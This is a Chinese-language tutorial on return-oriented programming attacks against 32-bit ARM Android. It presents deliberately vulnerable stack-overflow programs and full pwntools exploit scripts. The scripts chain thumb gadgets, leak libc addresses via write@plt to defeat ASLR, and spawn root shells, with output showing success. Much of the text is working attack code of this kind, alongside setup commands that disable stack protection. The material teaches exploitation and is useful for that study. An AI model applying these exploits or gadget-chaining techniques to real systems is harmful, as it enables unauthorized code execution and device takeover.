原文 by 蒸米  

## 0x00 序

ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。之前我们主要讨论了linux上的ROP攻击：  

在这次的教程中我们会带来arm上rop利用的技术，欢迎大家继续学习。  

另外文中涉及代码可在我的github下载: 
https://github.com/zhengmin1989/ROP_STEP_BY_STEP  

## 0x01 ARM上的Buffer Overflow

作为一个程序员我们的目标是要会写所有语言的”hello world”。同样的，作为一个安全工程师，我们的目标是会exploit掉所有语言的buffer overflow。：）因为buffer overflow实在是太经典了，所以我们的arm篇也是从buffer overflow开始。 

首先来看第一个程序 level6.c：  
``` c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void callsystem()
{
system("/system/bin/sh");
}

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
if (argc==2&&strcmp("passwd",argv[1])==0)
callsystem();
write(STDOUT_FILENO, "Hello, World\n", 13);    
vulnerable_function();
}
```
我们的目标是在不使用密码的情况下，获取到shell。为了减少难度，我们先将stack canary去掉（在JNI目录下建立Application.mk并加入APP_CFLAGS += -fno-stack-protector）。随后用ndk-build进行编译。然后将level6文件拷贝到"/data/local/tmp"目录下。接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成。最后我们再做一个端口转发，准备工作就算完成了。基本命令如下：  
```
ndk-build
adb push libs/armeabi/level6 /data/local/tmp/
adb shell
cd /data/local/tmp/
./socat TCP4-LISTEN:10001,fork EXEC:./level6
adb forward tcp:10001 tcp:10001
```
现在我们尝试连接一下：  
```
$ nc 127.0.0.1 10001
Hello, World
```
发现工作正常。OK，那么我们开始进行BOF吧。   

和之前的x86一样，我们先用pattern.py来确定溢出点的位置。我们用命令：    

`python pattern.py create 150 `
来生成一串测试用的150个字节的字符串：  
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```
然后我们写一个py脚本来发送这串数据。  
``` python
#!/usr/bin/env python
from pwn import *

#p = process('./level6')
p = remote('127.0.0.1',10001)

p.recvuntil('\n')

raw_input()

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"

p.send(payload)

p.interactive()
```
但因为我们需要获取崩溃时pc的值，所以在发送数据前，我们先使用gdb加载上level6。  

我们先在电脑上运行python脚本：  
```
[pc]$ python test.py 
[+] Opening connection to 127.0.0.1 on port 10001: Done
…
```
然后在adb shell中用ps获取level6的pid，然后再挂载level6，然后用c继续：  
```
[adb]# ./gdb --pid=4895

GNU gdb 6.7
Copyright (C) 2007 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
……
Loaded symbols for /system/lib/libm.so
0xb6eff268 in read () from /system/lib/libc.so
(gdb) c
Continuing.
```
然后我们再在电脑上输入回车，让脚本发送数据。然后我们就能够在gdb里看到崩溃的pc的值了：  
```
Program received signal SIGSEGV, Segmentation fault.
0x41346540 in ?? ()
(gdb) 
```
因为我们编译的level6默认是thumb模式，所以我们要在这个崩溃的地址上加个1：0x41346540+1 = 0x41346541。然后用pattern.py计算一下溢出点的位置：  
```
$ python pattern.py offset 0x41346541
hex pattern decoded as: Ae4A
132
```
OK，我们知道了溢出点的位置，接下来我们找一下返回的地址。其实利用的代码在程序中已经有了。我们只要将pc指向callsystem()这个函数地址即可。我们在ida中可以看到地址为0x00008554：  


![](../pictures/linuxrop8.jpg)   

因为callsystem()被编译成了thumb指令，所以我们需要将地址+1，让pc知道这里的代码为thumb指令，最终exp如下：  
``` python
#!/usr/bin/env python
from pwn import *

#p = process('./level6')
p = remote('127.0.0.1',10001)

p.recvuntil('\n')

callsystemaddr = 0x00008554 + 1
payload =  'A'*132 + p32(callsystemaddr)

p.send(payload)

p.interactive()
```
执行效果如下：  
```
$ python level6.py 
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
$ /system/bin/id
uid=0(root) gid=0(root) context=u:r:shell:s0
```

## 0x02 寻找thumb gadgets

下面我们来看第二个程序level7.c：  
``` c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

char *str="/system/bin/sh";

void callsystem()
{
system("id");
}

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
if (argc==2&&strcmp("passwd",argv[1])==0)
callsystem();
write(STDOUT_FILENO, "Hello, World\n", 13);    
vulnerable_function();
}
```
在这个程序里，我们即使知道密码，也仅仅只能执行”id”这个命令，我们的目标是获取到一个可以使用的shell，也就是执行system("/system/bin/sh")。怎么办呢？这里我们就需要来寻找可利用的gadgets，先让r0指向"/system/bin/sh"这个字符串的地址，然后再调用system()函数达到我们的目的。  

如何寻找gadgets呢？虽然用ida或者objdump也可以进行查找，但比较费时费力，这里我推荐使用ROPGadget。因为level7默认会编译成thumb指令，所以我们也采用thumb模式查找gadgets:  
```
$ ROPgadget --binary=./level7 --thumb | grep "ldr r0"
0x00008618 : add r0, pc ; b #0x862e ; ldr r0, [pc, #0x10] ; add r0, pc ; ldr r0, [r0] ; b #0x8634 ; movs r0, #0 ; pop {pc}
0x0000861e : add r0, pc ; ldr r0, [r0] ; b #0x862e ; movs r0, #0 ; pop {pc}
0x0000893e : add r3, sp, #0xc ; movs r1, #0 ; str r3, [sp] ; adds r3, r1, #0 ; bl #0x8916 ; ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
0x000090fe : add r3, sp, #0xc ; str r3, [sp] ; movs r2, #0xc ; adds r3, r1, #0 ; bl #0x8916 ; ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
0x000093ca : add sp, #0x10 ; pop {r4, pc} ; push {r3, lr} ; bl #0x911c ; ldr r0, [r0, #0x48] ; pop {r3, pc}
0x00008826 : add sp, r3 ; pop {r4, r5, r6, r7, pc} ; mov r8, r8 ; stc2 p15, c15, [r4], #-0x3fc ; ldr r0, [r0, #0x44] ; bx lr
……
```
在这些gadgets中，我们成功找到了一个gadget可以符合我们的要求：  

`0x0000894a : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}`
接下来就是找system和"/system/bin/sh"的地址，分别为0x00008404和000096C0：  


![](../pictures/linuxrop9.jpg)   


![](../pictures/linuxrop10.jpg)   

要注意的是，因为system()函数在plt区域，并没有被编译成thumb指令，而是普通的arm指令，因此并不需要将地址+1。最终level7.py如下：  
``` python
#!/usr/bin/env python
from pwn import *

#p = process('./level7')
p = remote('30.10.20.253',10001)

p.recvuntil('\n')

#0x0000894a : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x0000894a + 1

#"/system/bin/sh"
r0 = 0x000096C0

#.plt:00008404 ; int system(const char *command)
systemaddr = 0x00008404 

payload =  '\x00'*132 + p32(gadget1) + "\x00"*0xc + p32(r0) + "\x00"*0x4 + p32(systemaddr)

p.send(payload)

p.interactive()
```
执行结果如下：  
```
$ python level7.py 
[+] Opening connection to 30.10.20.253 on port 10001: Done

[*] Switching to interactive mode
$ /system/bin/id
uid=0(root) gid=0(root) context=u:r:shell:s0·
```

## 0x03 Android上的ASLR

Android上的ASLR其实伪ASLR，因为如果程序是由皆由zygote fork的，那么所有的系统library(libc,libandroid_runtime等)和dalvik - heap的基址都会是相同的，并且和zygote的内存布局一模一样。比如我们随便看两个由zygote fork的进程：  
```
root@hammerhead:/ # cat /proc/1698/maps
400e8000-400ed000 r-xp 00000000 b3:19 8201       /system/bin/app_process
400ed000-400ee000 r--p 00004000 b3:19 8201       /system/bin/app_process
400ee000-400ef000 rw-p 00005000 b3:19 8201       /system/bin/app_process
400ef000-400fe000 r-xp 00000000 b3:19 8248       /system/bin/linker
400fe000-400ff000 r-xp 00000000 00:00 0          [sigpage]
400ff000-40100000 r--p 0000f000 b3:19 8248       /system/bin/linker
40100000-40101000 rw-p 00010000 b3:19 8248       /system/bin/linker
40101000-40104000 rw-p 00000000 00:00 0 
40104000-40105000 r--p 00000000 00:00 0 
40105000-40106000 rw-p 00000000 00:00 0          [anon:libc_malloc]
40106000-40109000 r-xp 00000000 b3:19 49324      /system/lib/liblog.so
40109000-4010a000 r--p 00002000 b3:19 49324      /system/lib/liblog.so
4010a000-4010b000 rw-p 00003000 b3:19 49324      /system/lib/liblog.so
4010b000-40153000 r-xp 00000000 b3:19 49236      /system/lib/libc.so
40153000-40155000 r--p 00047000 b3:19 49236      /system/lib/libc.so
40155000-40158000 rw-p 00049000 b3:19 49236      /system/lib/libc.so



root@hammerhead:/ # cat /proc/1720/maps
400e8000-400ed000 r-xp 00000000 b3:19 8201       /system/bin/app_process
400ed000-400ee000 r--p 00004000 b3:19 8201       /system/bin/app_process
400ee000-400ef000 rw-p 00005000 b3:19 8201       /system/bin/app_process
400ef000-400fe000 r-xp 00000000 b3:19 8248       /system/bin/linker
400fe000-400ff000 r-xp 00000000 00:00 0          [sigpage]
400ff000-40100000 r--p 0000f000 b3:19 8248       /system/bin/linker
40100000-40101000 rw-p 00010000 b3:19 8248       /system/bin/linker
40101000-40104000 rw-p 00000000 00:00 0 
40104000-40105000 r--p 00000000 00:00 0 
40105000-40106000 rw-p 00000000 00:00 0          [anon:libc_malloc]
40106000-40109000 r-xp 00000000 b3:19 49324      /system/lib/liblog.so
40109000-4010a000 r--p 00002000 b3:19 49324      /system/lib/liblog.so
4010a000-4010b000 rw-p 00003000 b3:19 49324      /system/lib/liblog.so
4010b000-40153000 r-xp 00000000 b3:19 49236      /system/lib/libc.so
40153000-40155000 r--p 00047000 b3:19 49236      /system/lib/libc.so
40155000-40158000 rw-p 00049000 b3:19 49236      /system/lib/libc.so
```
可以看到地址都是一模一样的。这意味着什么呢？我们知道android上所有的app都是由zygote fork出来的，因此我们只要在自己的app上得到libc.so等库的地址就可以知道其他app上的地址了。  

假设我们已经知道了目标app的libc.so在内存中的地址了，那么应该如何控制pc执行我们希望的rop呢？OK，现在我们现在来看level8.c：  
``` c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<dlfcn.h>

void getsystemaddr()
{
void* handle = dlopen("libc.so", RTLD_LAZY);
printf("%p\n",dlsym(handle,"system"));
fflush(stdout);
}

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
getsystemaddr();
write(STDOUT_FILENO, "Hello, World\n", 13);    
vulnerable_function();
}
```
这个程序会先输出system的地址，相当于我们已经获取了这个进程的内存布局了。接下来要做的就是在libc.so中寻找我们需要的gadgets和字符串地址。因为libc.so很大，我们完全不用担心找不到需要的gadgets，并且我们只需要控制一个r0即可。因此这些gadgets都能满足我们的需求：  
```
0x00014f48 : ldr r0, [sp, #4] ; pop {r1, r2, r3, pc}
0x0002e404 : ldr r0, [sp, #4] ; pop {r2, r3, r4, r5, r6, pc}
0x00034ace : ldr r0, [sp] ; pop {r1, r2, r3, pc}
```
接下来就是在libc.so中找system()和"/system/bin/sh"的位置：  


![](../pictures/linuxrop11.jpg)   


![](../pictures/linuxrop12.jpg)   

可以看到地址分别为0x000253A4和0x0003F9B4。当然了，就算获取了这些地址，我们也需要根据system()在内存中的地址进行偏移量的计算才能够成功的找到gadgets和"/system/bin/sh"在内存中的地址。除此之外，还要注意thumb指令和arm指令的转换问题。最终的exp level8.py如下：  
``` python
#!/usr/bin/env python
from pwn import *

#p = process('./level8')
p = remote('127.0.0.1',10001)

system_addr_str = p.recvuntil('\n')
print "str:" + system_addr_str
system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)

p.recvuntil('\n')

#.text:000253A4                 EXPORT system

#0x00034ace : ldr r0, [sp] ; pop {r1, r2, r3, pc}
gadget1 = system_addr + (0x00034ace - 0x000253A4)
print "gadget1 = " + hex(gadget1)

#.rodata:0003F9B4 aSystemBinSh    DCB "/system/bin/sh",0
r0 = system_addr + (0x0003F9B4 - 0x000253A4) - 1
print "/system/bin/sh addr = " + hex(r0)

payload =  '\x00'*132 + p32(gadget1) + p32(r0) + "\x00"*0x8 + p32(system_addr)

p.send(payload)

p.interactive()
```
执行结果如下：  
```
$ python level8.py 
[+] Opening connection to 127.0.0.1 on port 10001: Done
system_addr = 0xb6f1e3a5
gadget1 = 0xb6f2dacf
/system/bin/sh addr = 0xb6f389b4
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) context=u:r:shell:s0
```

## 0x04 Android上的information leak

在上面的例子中，我们假设已经知道了libc.so的基址了，但是如果我们是进行远程攻击，并且原程序中没有调用system()函数怎么办？这意味着目标程序的内存布局对我们来说是随机的，我们并不能直接调用libc.so中的gadgets，因为我们并不知道libc.so在内存中的地址。其实这也是有办法的，我们首先需要一个information leak的漏洞来获取libc.so在内存中的地址，然后再控制pc去执行我们的rop。现在我们来看level9.c:  
``` c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<dlfcn.h>

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
write(STDOUT_FILENO, "Hello, World\n", 13);
vulnerable_function();
}
```

![](../pictures/linuxrop13.jpg)   


![](../pictures/linuxrop14.jpg)   

虽然程序非常简单，可用的gadgets很少。但好消息是我们发现除了程序本身的实现的函数之外，我们还可以使用write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为android和linux类似采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读潘爱民老师的《程序员的自我修养 - 链接、装载与库》这本书，潘老师是我主管的事情我才不会告诉你。）  

因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标手机上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行第二次溢出攻击了，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。  

另外需要注意的是write()函数是三个参数，因此我们还需要控制r1和r2才行，刚好程序中有如下gadget可以满足我们的需求：  

`#0x0000863a : pop {r1, r2, r4, r5, r6, pc}`
另外为了能再一次返回vulnerable_function()，我们需要构造好执行完write函数后的栈的数据，让程序执行完ADD SP, SP,#0x84;POP {PC}后，PC能再一次指向0x000084D8。  


![](../pictures/linuxrop15.jpg)   

最终的explevel9.py如下：  
``` python
#!/usr/bin/env python
from pwn import *

#p = process('./level7')
p = remote('30.10.20.253',10001)

p.recvuntil('\n')

#0x00008a12 : ldr r0, [sp, #0xc] ; add sp, #0x14 ; pop {pc}
gadget1 = 0x000088be + 1

#0x0000863a : pop {r1, r2, r4, r5, r6, pc}
gadget2 = 0x0000863a + 1

#.text:000084D8 vulnerable_function
ret_to_vul = 0x000084D8 + 1

#write(r0=1, r1=0x0000AFE8, r2=4)
r0 = 1
r1 = 0x0000AFE8
r2 = 4
r4 = 0
r5 = 0
r6 = 0
write_addr_plt = 0x000083C8

payload =  '\x00'*132 + p32(gadget1) + '\x00'*0xc + p32(r0) + '\x00'*0x4 + p32(gadget2) + p32(r1) + p32(r2) + p32(r4) + p32(r5) + p32(r6) + p32(write_addr_plt) + '\x00' * 0x84 + p32(ret_to_vul)

p.send(payload)

write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)

#.rodata:0003F9B4 aSystemBinSh    DCB "/system/bin/sh",0
#.text:000253A4                 EXPORT system
#.text:00020280                 EXPORT write

r0 = write_addr + (0x0003F9B4 - 0x00020280)
system_addr = write_addr + (0x000253A4 - 0x00020280) + 1

print 'r0=' + hex(r0)
print 'system_addr=' + hex(system_addr)

payload2 =  '\x00'*132 + p32(gadget1) + "\x00"*0xc + p32(r0) + "\x00"*0x4 + p32(system_addr)

p.send(payload2)

p.interactive()
```
执行exp的结果如下：  
```
$ python level9.py 
[+] Opening connection to 30.10.20.253 on port 10001: Done
write_addr=0xb6f27280
r0=0xb6f469b4
system_addr=0xb6f2c3a5
[*] Switching to interactive mode
$ /system/bin/id
uid=0(root) gid=0(root) context=u:r:shell:s0
```

## 0x05 Android ROP调试技巧

因为gdb对thumb指令的解析并不好，所以我还是推荐用ida来进行调试。如果你还不会用ida，可以先看一下我之前写的关于ida调试的文章：  

安卓动态调试七种武器之孔雀翎– Ida pro  
除此之外，还有个很重要的技巧就是如何让ida正确的解析指令。ida在很多时候并不知道需要解析的指令是thumb还是arm，有时候甚至都不知道是啥内容。  

比如图中是libc.so中system的代码：    


![](../pictures/linuxrop16.jpg)   

这段代码其实是thumb指令，但是我们怎么样才能让ida解析正确呢？方法就是用鼠标选中0xB6EE03A4，然后按alt+g键，然后将value改成0x1。这样的话，ida就会按照thumb指令来解析这段数据了。  


![](../pictures/linuxrop17.jpg) 

我们随后选中那块数据然后按c键，就可以看到指令被正确的解析了。  

![](../pictures/linuxrop18.jpg)   

## 0x06 总结

我们这篇文章介绍了32位android的ROP。另外文中涉及代码可在我的github下载:   

https://github.com/zhengmin1989/ROP_STEP_BY_STEP   